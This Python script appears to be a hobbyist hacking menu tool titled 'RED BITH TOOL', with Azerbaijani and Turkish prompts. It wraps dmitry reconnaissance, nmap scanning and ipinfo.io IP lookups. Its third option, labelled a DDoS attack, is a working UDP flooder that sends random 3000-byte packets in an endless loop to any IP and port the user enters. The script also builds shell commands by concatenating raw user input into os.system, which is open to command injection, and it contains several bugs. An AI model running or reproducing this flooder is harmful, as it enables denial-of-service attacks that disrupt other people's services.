import json
from urllib.request import urlopen
import os
import socket
import random
import subprocess
import signal
from termcolor import colored
os.system("clear")


print("""\033[94m
##############################################################
# BOOT v1.0.2 #                                              #
###############                                              #  
# LİNUX?yoxsaTERMUX?---hansından bağlanırsınız?              #
# 1---linux                                                  #
# 2---termux(Yükləmələr var və uzun çəkə bilər,normaldır.    #                                 
# BİLƏRƏK YANLIŞ CAVAB VERSƏNİZ SİSTEMİNİZDƏ XƏTA OLA BİLƏR! #
# YÜKLƏMƏ ZAMANI SUAL GƏLDİYİ SAMAN Y YAZIN.                 #
##############################################################
\033[0m""")
r = input("daxil et:")
if(r == "1"):
    os.system("pip install requests")
    import requests
    os.system("pip3 installl termcolor")
    os.system("pip3 install tabulate")
    os.system("apt install python3")
    os.system("apt install dmitry")
    os.system("apt install nmap")
    os.system("python -m pip install --upgrade pip")
    os.system("python -m pip install --upgrade termcolor")
    from tabulate import tabulate
    from termcolor import colored
    os.system("clear")
   
elif(r == "2"):
    os.system("pkg update")
    os.system("apt-get update&&upgrade")
    os.system("pkg install openssl")
    os.system("pip install termcolor")
    os.system("pip install requests")
    
    os.system("pip install requests")
    import requests
    
    os.system("pip3 installl termcolor")
    os.system("pip install tabulate")
    os.system("apt install python3")
    os.system("apt install dmitry")
    os.system("apt install nmap")
    os.system("python -m pip install --upgrade pip")
    os.system("python -m pip install --upgrade termcolor")
    from tabulate import tabulate
    from termcolor import colored
    os.system("clear")
elif(r == 3):
    import os
    os.system("clear")
    os.system("python uyarlama.py")
    
# Renkli çıktılar için ANSI kaçış dizilerini tanımlayalım
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'

# Renkli bir şekilde çıktı vermek için kullanabileceğiniz bir fonksiyon
def print_colored(text, color):
    print(color + text + Colors.ENDC)


def durdur(signal, frame):
    print_colored("Program söndürülür...", Colors.YELLOW)
    os._exit(0)


# Ctrl+C sinyalini yakalamak için signal modülünü kullanıyoruz
signal.signal(signal.SIGINT, durdur)

# Programınızın geri kalan kodu
# ...

# Birden fazla renkte metin yazdırma
metin = ('''\033[91m
 /$$$$$$$        /$$$$$$$$       /$$$$$$$ 
| $$__  $$      | $$_____/      | $$__  $$
| $$  \ $$      | $$            | $$  \ $$
| $$$$$$$/      | $$$$$         | $$  | $$
| $$__  $$      | $$__/         | $$  | $$
| $$  \ $$      | $$            | $$  | $$
| $$  | $$      | $$$$$$$$      | $$$$$$$/
|__/  |__/      |________/      |_______/ 
                                          
                                          
\033[0m''') + ('''\033[92m
 
 /$$$$$$$$        /$$$$$$         /$$$$$$        /$$            
|__  $$__/       /$$__  $$       /$$__  $$      | $$            
   | $$         | $$  \ $$      | $$  \ $$      | $$            
   | $$         | $$  | $$      | $$  | $$      | $$            
   | $$         | $$  | $$      | $$  | $$      | $$            
   | $$         | $$  | $$      | $$  | $$      | $$            
   | $$         |  $$$$$$/      |  $$$$$$/      | $$$$$$$$      
   |__/          \______/        \______/       |________/  
\033[92m''')
print(metin)

print_colored("|XOS GELMİSİNİZ|", Colors.BLUE)
print_colored("|RED BITH TOOL|", Colors.RED)
print_colored("| BY RED_BITH  |", Colors.GREEN)

print_colored("""1.Hedef site haqqinda
2.port scanner
3.DDOS hucum
4.Ip addres Melumat
5.Hedef site banner decode(demo)
""", Colors.YELLOW)

secim = input("Nov sec:")

if secim == '1':
    hedefsite = input('Hedef site adresi')
    os.system('dmitry ' + hedefsite)

elif secim == '2':
    hedef = input('Sayt adresi ve ya ip daxit et:')
    os.system('nmap ' + hedef)

elif secim == '3':
    print_colored("""
    ###########################
    #  T00L - By RED_BITH     #
    #  ATTACK- DDOS           #
    #  HUCUMA HAZIRDIR        #
    ###########################
    """, Colors.RED)
    
    hedef_ip = input("Hedef ip daxil et:")
    hedef_port = int(input("Hedef port:"))

    bytes = random._urandom(3000)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sayac = 0
    while True:
        sock.sendto(bytes, (hedef_ip, hedef_port))
        sayac += 1
        print("\033[92mHUCUM EDILIR , gonderilen byte:%s\033[0m" % (sayac))

elif secim == '4':
    print_colored("""
    ###############################
    #  ATTACK- Ip melumat         #
    #   BY RED-BITH               #
    # ASAGIDAKI QAYDALARA EMEL ET #
    ###############################
    """, Colors.GREEN)
    
    print_colored("OZ ip niz haqqinda ? yaxud qarsi teref?", Colors.BLUE)
    secim3 = input("SECIMINI ET--1-Oz ip; 2-qarsi ip:")
    
    if secim3 == '1':
        def get_own_ip_info():
            url = "https://ipinfo.io/json"
            response = requests.get(url)
            data = response.json()
            return data

        own_ip_info = get_own_ip_info()
        print_colored(json.dumps(own_ip_info, indent=4), Colors.YELLOW)

    elif secim3 == '2':
        url = "https://ipinfo.io/" + input("İP DAXİL ET: ")
        response = urlopen(url)
        data = json.load(response)

        table_data = [
            ["IP", data["ip"]],
            ["city", data["city"]],
            ["Region", data["region"]],
            ["Country", data["country"]],
            ["Postal Code", data["postal"]],
            ["Organization", data["org"]],
            ["ASN", data.get("asn", ["N/A"])[0]],
            ["IP Range", data.get("ip_range", "N/A")],
            ["Local Time", data.get("timezone", "N/A")],
            ["Timezone", data.get("timezone", "N/A")],
            ["Coordinates", data.get("loc", "N/A")],
            ["Privacy Detection", data.get("privacy", "N/A")]
        ]

        table = tabulate(table_data, headers=["Field", "Value"], tablefmt="grid")
        print_colored(table, Colors.BLUE)

elif(secim == "5"):
    os.system("clear")
    os.system("cd TOXUNMA")
    os.system("python system.py")

else:
    print_colored("----Xəta baş verdi!", Colors.RED)
    print_colored("""----Yenidən başlatma üçün : 1.
    ----Çıxış etmək üçün :2.""", Colors.YELLOW)
    secim2 = input("Qərar ver:")
    
    if secim2 == '1':
        durdur()
        os.system("python RED_TooLL.py")
    elif secim2 == '2':
        durdur()
    else:
        durdur()


    
    
        
